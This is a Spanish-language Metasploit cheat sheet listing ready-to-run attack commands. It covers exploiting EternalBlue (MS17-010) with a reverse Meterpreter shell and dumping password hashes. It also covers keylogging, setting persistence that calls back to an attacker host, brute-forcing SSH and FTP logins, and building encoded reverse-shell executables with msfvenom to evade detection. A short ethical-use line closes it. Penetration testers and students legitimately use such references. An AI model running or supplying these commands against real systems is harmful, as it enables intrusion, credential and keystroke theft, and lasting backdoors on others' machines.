# Metasploit CheatSheet

## 🚀 Inicio y Configuración

### Iniciar Metasploit
```bash
msfconsole
msfdb init  # Inicializar base de datos
```

### Actualizar Metasploit
```bash
msfupdate
```

## 🔍 Búsqueda de Exploits

### Buscar Exploits
```bash
search [término]
search type:exploit platform:windows
search cve:2017-0144
```

### Información de Exploit
```bash
info [exploit_name]
```

## 🎯 Uso de Exploits

### Seleccionar Exploit
```bash
use exploit/windows/smb/ms17_010_eternalblue
```

### Ver Opciones
```bash
show options
show payloads
show targets
```

### Configurar Opciones
```bash
set RHOSTS 192.168.1.100
set RPORT 445
set LHOST 192.168.1.10
set LPORT 4444
```

### Ejecutar Exploit
```bash
exploit
run
```

## 💣 Payloads Comunes

### Windows
```bash
windows/meterpreter/reverse_tcp
windows/shell/reverse_tcp
windows/x64/meterpreter/reverse_tcp
```

### Linux
```bash
linux/x86/meterpreter/reverse_tcp
linux/x64/shell/reverse_tcp
```

### Web
```bash
php/meterpreter/reverse_tcp
java/jsp_shell_reverse_tcp
```

## 🎮 Comandos Meterpreter

### Información del Sistema
```bash
sysinfo
getuid
getpid
ps
```

### Navegación
```bash
pwd
ls
cd [directorio]
cat [archivo]
```

### Escalación de Privilegios
```bash
getsystem
getprivs
```

### Persistencia
```bash
run persistence -X -i 10 -p 4444 -r 192.168.1.10
```

### Post-Explotación
```bash
hashdump
screenshot
keyscan_start
keyscan_dump
```

## 🛠️ Herramientas Auxiliares

### Escáneres
```bash
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/http/dir_scanner
```

### Fuerza Bruta
```bash
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/ftp/ftp_login
```

## 🏗️ Generación de Payloads

### msfvenom Básico
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe
```

### Encoders
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > encoded.exe
```

## 🎯 Recursos y Workspaces

### Workspaces
```bash
workspace
workspace -a [nombre]
workspace [nombre]
workspace -d [nombre]
```

### Base de Datos
```bash
db_status
hosts
services
vulns
```

## 📊 Ejemplos Prácticos

### EternalBlue (MS17-010)
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit
```

### Web Shell Upload
```bash
use exploit/multi/http/php_cgi_arg_injection
set RHOSTS [target]
set RPORT 80
exploit
```

---
**⚠️ Uso Ético**: Solo para pruebas autorizadas y educación en ciberseguridad.
